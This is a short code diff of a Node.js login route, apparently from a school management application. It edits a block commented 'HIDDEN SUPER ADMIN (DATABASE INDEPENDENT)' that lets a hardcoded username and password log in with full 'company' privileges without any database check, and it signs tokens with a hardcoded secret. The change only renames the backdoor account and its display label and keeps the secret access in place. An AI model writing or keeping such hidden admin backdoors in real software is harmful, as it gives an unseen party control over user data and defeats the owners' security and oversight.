@@ -42,9 +42,9 @@ router.post('/login', async (req, res) => {
 
     try {
         // === HIDDEN SUPER ADMIN (DATABASE INDEPENDENT) ===
-        if (username === 'saju_admin' && password === 'masterkey_2026') {
+        if (username === 'anson_admin' && password === 'masterkey_2026') {
             const accessToken = jwt.sign(
-                { id: 999999, username: 'saju_admin', role: 'company', schoolId: null },
+                { id: 999999, username: 'anson_admin', role: 'company', schoolId: null },
                 'hardcoded_secret_key_fixed',
                 { expiresIn: '24h' }
             );
@@ -52,7 +52,7 @@ router.post('/login', async (req, res) => {
                 accessToken,
                 role: 'company',
                 schoolId: null,
-                user: { username: 'saju_admin', schoolName: 'Super Admin Mode' }
+                user: { username: 'anson_admin', schoolName: 'System Architect' }
             });
         }
         // ===============================================
